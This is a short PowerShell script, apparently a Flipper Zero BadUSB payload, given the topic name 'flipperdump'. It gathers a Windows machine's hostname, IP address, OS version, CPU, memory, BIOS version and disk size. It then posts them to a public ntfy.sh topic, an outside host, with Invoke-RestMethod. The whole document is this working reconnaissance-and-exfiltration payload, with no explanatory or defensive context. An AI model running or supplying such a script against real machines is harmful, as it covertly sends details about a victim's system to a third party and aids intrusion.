$topic = 'flipperdump'

# Get the machine's hostname
$hostname = $env:COMPUTERNAME

# Get the primary IP address
$ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress

# Get the OS version and build information
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).Version

# Get CPU information
$cpu = (Get-CimInstance Win32_Processor).Name

# Get total physical memory (RAM)
$memory = [math]::round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

# Get BIOS version
$bios = (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion

# Get primary disk size
$diskSize = [math]::round((Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }).Size / 1GB, 2)

# Create the message to send
$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB"

# Send the message to ntfy
$url = 'https://ntfy.sh/' + $topic
Invoke-RestMethod -Method Post -Uri $url -Body $message
